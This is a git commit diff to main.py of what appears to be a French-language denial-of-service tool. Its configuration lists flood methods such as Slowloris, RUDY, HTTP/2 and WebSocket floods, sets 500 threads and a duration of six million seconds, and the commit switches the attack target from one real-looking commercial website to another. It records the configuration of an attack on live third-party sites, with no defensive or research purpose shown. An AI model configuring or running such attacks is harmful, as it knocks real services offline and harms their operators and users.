53d839c6e987112d3e4d4eb65f1c5eb901f6f0df
KnSAstro <aydenlucas28@gmail.com>
2026-03-02 23:27:34 +0100

    Modification du fichier main.py

--- main.py
+++ main.py
@@ -29,7 +29,7 @@ METHOD = 7              # Méthode d'attaque (1 à 10) :
                         # 4=Slowloris          9=Layer7 HTTP/2
                         # 5=RUDY              10=WebSocket Flood
 
-TARGET = "https://o-tacos.com/fr"   # Cible : IP ou URL (ex: "192.168.1.1" ou "http://example.com")
+TARGET = "https://fr.borntobefuck.com/"   # Cible : IP ou URL (ex: "192.168.1.1" ou "http://example.com")
 PORT = 80                       # Port (utilisé pour méthodes 1,2,4,5,6)
 DURATION = 6000000                   # Durée en secondes
 THREADS = 500                   # Nombre de threads / concurrence
